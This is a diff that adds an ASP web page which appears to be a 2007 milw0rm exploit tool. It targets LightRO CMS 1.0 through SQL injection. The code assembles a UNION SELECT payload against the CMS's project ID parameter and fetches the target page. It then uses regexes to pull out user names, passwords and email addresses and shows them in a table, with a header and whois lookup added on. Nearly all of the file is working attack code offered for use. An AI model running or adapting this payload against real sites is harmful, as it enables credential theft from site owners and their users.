@@ -1,0 +1,390 @@
+<% Response.Buffer = True %>
+<% On Error Resume Next %>
+<% Server.ScriptTimeout = 100 %>
+
+<%
+'===============================================================================================
+'[Script Name: LightRO CMS 1.0 (index.php projectid) Remote SQL Injection Exploit
+'[Coded by   : ajann
+'[Author     : ajann
+'[Contact    : :(
+'[S.Page     : http://www.lightro.de.tc/
+'[ExploitName: exploit2.asp
+
+'[Note  : exploit file name =>exploit2.asp
+'[Update: + Get Header
+'[Update: + Get Whois Info
+'===============================================================================================
+
+%>
+
+<%
+
+title="LightRO CMS 1.0 (index.php projectid) Remote SQL Injection Exploit" 'Vuln Title
+
+%>
+<html>
+<title><% = title %></title>
+<head>
+<meta name="generator" content="Microsoft FrontPage 5.0">
+
+<script language="JavaScript">    
+  function functionControl1(){  
+        setTimeout("functionControl2()",2000);    
+     }  
+  
+  function functionControl2(){  
+            if(document.form1.field1.value==""){  
+ 
+     alert("[Exploit Failed]=>The Username and Password Didnt Take,Try Again");
+        
+                             }  
+                        }
+
+  function writetext() {
+
+            if(document.form1.field1.value==""){
+document.getElementById('htmlAlani').innerHTML='<font face=\"Verdana\" size=\"1\" color=\"#008000\">There is a problem... The Data Didn\'t Take </font>'
+
+                            }
+                 }
+  function write(){  
+        setTimeout("writetext()",1000);    
+     }  
+  
+</script>
+
+
+</head>
+<body bgcolor="#000000" link="#008000" vlink="#008000" alink="#008000">
+
+<center>
+<font face="Verdana" size="2" color="#008000"><b><a href="exploit2.asp"><u><% = title %>
+</b></u></a></font><br><br>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="35%" id="AutoNumber1" bordercolorlight="#808080" bordercolordark="#008000" bordercolor="#808080">
+  <tr>
+    <td width="50%" bgcolor="#808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';">
+    <font face="Arial" size="1"><b><font color="#FFFFFF">TARGET:</font>Example:[http://x.com/path]</b></font><p>
+    <b><font face="Arial" size="1" color="#FFFFFF">USER ID:</font></b><font face="Arial" size="1"><b>Example:[User 
+    ID=1]</b></font></p>
+  </td>
+    <td width="50%">
+ <center>
+<form method="post" name="form1" action="exploit2.asp?islem=get">
+<input type="text" name="text1" value="http://" size="25" style="background-color: #808080"><br><input type="text" name="id" value="10" size="25" style="background-color: #808080">
+<input type="submit" value="Get"></form></center></td>
+  </tr>
+
+</table>
+
+<div id=htmlAlani></div>
+
+<%
+islem = Request.QueryString("islem")    
+
+If islem = "hata1" Then 
+Response.Write "<font face=""Verdana"" size=""1"" color=""#008000"">There is a problem! Please complete to the whole spaces</font>"
+End If
+
+If islem = "hata2" Then 
+Response.Write "<font face=""Verdana"" size=""1"" color=""#008000"">There is a problem! Please right character use</font>"
+End If
+
+If islem = "hata3" Then 
+Response.Write "<font face=""Verdana"" size=""1"" color=""#008000"">There is a problem! Add ""http://""</font>"
+End If
+
+If islem = "hata4" Then 
+Response.Write "<font face=""Verdana"" size=""1"" color=""#008000"">There is a problem! Just Numeric Character!</font>"
+End If
+
+%>
+
+<%  
+
+If islem = "get" Then
+
+id= Request.Form("id")
+
+file="index.php?section=projects&ID="
+sql="-1'%20union%20select%200,1,6,7,8,9,2,3,4,5,10"
+sql1=",concat(char(85,115,101,114,110,9"
+sql2="7,109,101,58),name,char(32),char(80,97,"
+sql3="115,115,119,111,114,100,58),password"
+sql4="),concat(char(101,109,97,105,108,58),email),1"
+sql5="3,14,1,5,3,4,29%20from%20users%20where%20ID="
+sql6=id
+sql7="/*"
+
+
+idform = Request.Form("id")
+targettext = Request.Form("text1")
+arama=InStr(1, targettext, "union" ,1)
+arama2=InStr(1, targettext, "http://" ,1)
+
+If targettext="" Then
+Response.Redirect("exploit2.asp?islem=hata1")
+
+Else
+If arama>0 then 
+Response.Redirect("exploit2.asp?islem=hata2")
+
+Else
+If arama2=0 then 
+Response.Redirect("exploit2.asp?islem=hata3")
+
+Else
+IF Not IsNumeric(idform) Then
+Response.Redirect("exploit2.asp?islem=hata4")
+
+Else
+%> 
+
+<%
+
+target1 = targettext+file+sql+sql1+sql2+sql3+sql4+sql5+sql6+sql7
+
+Public Function take(come)
+Set objtake = Server.CreateObject("Microsoft.XMLHTTP" )
+With objtake
+  .Open "GET" , come, FALSE
+  .sEnd
+  
+take =  .Responsetext
+End With
+SET objtake = Nothing
+End Function
+
+
+get_username = take(target1)
+
+getdata=InStr(get_username,"0  0/" )
+username=Mid(get_username,getdata+5,90)
+
+Dim metin
+metin = take(target1)  
+
+Dim objReg
+Set objReg = New RegExp
+objReg.Global = False
+objReg.IgnoreCase = True
+
+objReg.Pattern = "Username:[A-Za-z0-9ý]+ Pass"
+Dim calistir, istediginString
+Set calistir = objReg.Execute(metin)
+
+
+If calistir.Count = 0 Then
+     Response.write "Not True"
+Else
+      basusername = Replace(calistir.Item(0), "Username:" , "" )
+      basusername = Replace(basusername, " Pass" , "" )
+
+
+
+      objReg.Pattern = "Password:[A-Za-z0-9ý]+</td>"
+      Set calistir = objReg.Execute(metin)
+      baspassword = Replace(calistir.Item(0), "Password:" , "" )
+      baspassword = Replace(baspassword, "</td>" , "" )
+
+     
+      objReg.Pattern = "email:[A-Za-z0-9@.]+</td>"
+      Set calistir = objReg.Execute(metin)
+      basemail = Replace(calistir.Item(0), "email:" , "" )
+      basemail = Replace(basemail, "</td>" , "" )
+
+End If  
+
+
+ 
+Set bulunanlar = Nothing
+Set objReg = Nothing
+
+%>
+
+<center>
+<font face="Verdana" size="2" color="#008000"> <u><b>
+ajann<br></b></u></font><br>
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="35%" id="AutoNumber1" bordercolorlight="#808080" bordercolordark="#008000" bordercolor="#808080">
+  <tr>
+    <td width="50%" bgcolor="#808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+    <b><font size="2" face="Arial">Username:</font></b></td>
+    <td width="80%">
+&nbsp;<b><font color="#C0C0C0" size="2" face="Verdana"><%=basusername%></b></font></p>
+ </td>
+  </tr>
+
+  <tr>
+    <td width="50%" bgcolor="#808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+    <b><font size="2" face="Arial">Password:</font></b></td>
+    <td width="80%">
+&nbsp;<b><font color="#C0C0C0" size="2" face="Verdana"><%=baspassword%></b></font></p>
+ </td>
+  </tr>
+
+ <tr>
+    <td width="50%" bgcolor="#808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+    <b><font size="2" face="Arial">Email:</font></b></td>
+    <td width="80%">
+&nbsp;<b><font color="#C0C0C0" size="2" face="Verdana"><%=basemail%></b></font></p>
+ </td>
+  </tr>
+
+</table>
+</center> 
+
+  <br>
+
+
+<%
+hedef = targettext
+Dim objem
+Set objem = Server.CreateObject("MSXML2.ServerXMLHTTP")
+objem.Open "GET" , hedef , false
+
+objem.sEnd
+
+strHTML = objem.ResponseText
+
+header=objem.getallResponseheaders()
+Response.Write "<center>"
+Response.Write "<b>"
+Response.Write "<p><font color=""#008000"" face=""Verdana"" size=""2"">Header Bilgileri</font></p>"
+Response.Write "</b>"
+Response.Write "<p><font color=""#008000"" face=""Verdana"" size=""2"">" & header & "</font></p>"
+Response.Write "<p><font color=""#008000"" face=""Verdana"" size=""2""><b>Whois</b></font></p>"
+Response.Write "<p><font size=""2"" color=""#008000"">Site:</font><font color=""#008000"" size=""1"">[google.com]</font></p>"
+Response.Write "</center>"
+Set objem=Nothing
+
+%>
+
+<center><form method="post" name="form2" action="exploit2.asp?islem=whois">
+  <p>
+  <input type="text" name="whoissite" size="20" value="domainwhois" style="font-family: Verdana; font-size: 10pt; color: #008000; border: 1px dashed #008000; background-color: #000000">
+  <input type="submit" value="Yolla" name="B1"></p>
+</form></center>
+
+     
+<br>
+
+
+<form method="POST" name="form2" action="#">    
+<input type="hidden" name="field1" size="20" value="sdfsd">     
+</form> 
+
+
+<script language="JavaScript">
+write()
+functionControl1()
+</script>
+
+</b></font>
+
+</body>
+</html>
+
+<%
+End If
+End If
+End If
+End If
+End If
+
+%>
+
+
+<%
+If islem = "whois" Then
+site = Request.Form("whoissite")
+target1 = "http://reports.internic.net/cgi/whois?whois_nic=" & site & "&type=domain"
+
+Public Function take(come)
+Set objtake = Server.CreateObject("Microsoft.XMLHTTP" )
+With objtake
+  .Open "GET" , come, FALSE
+  .sEnd
+take =  .Responsetext
+End With
+Set objtake = Nothing
+End Function
+
+remoteadres=take(target1)
+
+dim baslangic , bitis
+baslangic = "<pre>"
+bitis = "</pre>"
+dim x , abc
+x = 0
+abc = 0
+dim sonuc
+sonuc = ""
+
+Do Until abc = 2
+x = x + 1
+If Mid(remoteadres,x,Len(bitis)) = bitis and abc = 1 Then
+abc = abc + 1
+End If
+If Mid(remoteadres,x,Len(baslangic)) = baslangic Then
+abc = abc + 1
+Else
+If abc = 1 Then
+sonuc = sonuc + Mid(remoteadres,x,1)
+End If
+End If
+Loop
+
+Set objtake=Nothing
+ 
+%>
+
+<center>
+<b><font color="#008000" face="Verdana" size="2">Whois Bilgileri</font></b><p>
+<textarea rows="20" name="S1" cols="68" style="font-family: Verdana; font-size: 10pt; color: #008000; border: 1px dotted #008000; background-color: #000000">
+<% Response.Write "<" & sonuc %>
+</textarea>
+</p>
+</center>
+
+<center><form method="post" name="form2" action="exploit2.asp?islem=whois">
+  <p>
+  <input type="text" name="whoissite" size="20" value="domainwhois" style="font-family: Verdana; font-size: 10pt; color: #008000; border: 1px dashed #008000; background-color: #000000">
+  <input type="submit" value="Yolla" name="B1"></p>
+</form></center>
+
+
+
+<%
+End If
+%>
+
+<%
+Response.Write "<br>"
+Response.Write "<center>"
+Response.Write "<pre class=""info"">"
+Response.Write "<font color=""#C0C0C0"" size=""1"">"
+Response.Write "En iyi "
+Response.Write "</font>"
+Response.Write "<font size=""1"" color=""#808080""><span class=""info2"">"
+Response.Write "1152x864 "
+Response.Write "</span></font>"
+Response.Write "<font color=""#C0C0C0"" size=""1"">çözünürlük ve "
+Response.Write "<span class=""info2""><font size=""1"" color=""#808080"">Firefox </font></span>"
+Response.Write "ile görüntülünebilir.</font></pre>"
+
+Response.Write "<pre class=""info"">"
+Response.Write "<font color=""#C0C0C0"" size=""1"">"
+Response.Write "Exploit coded by "
+Response.Write "</font>"
+Response.Write "<font size=""1"" color=""#808080""><span class=""info2"">"
+Response.Write "ajann"
+Response.Write "</span></font>"
+Response.Write "</center>"
+
+%>
+
+# milw0rm.com [2007-02-08]
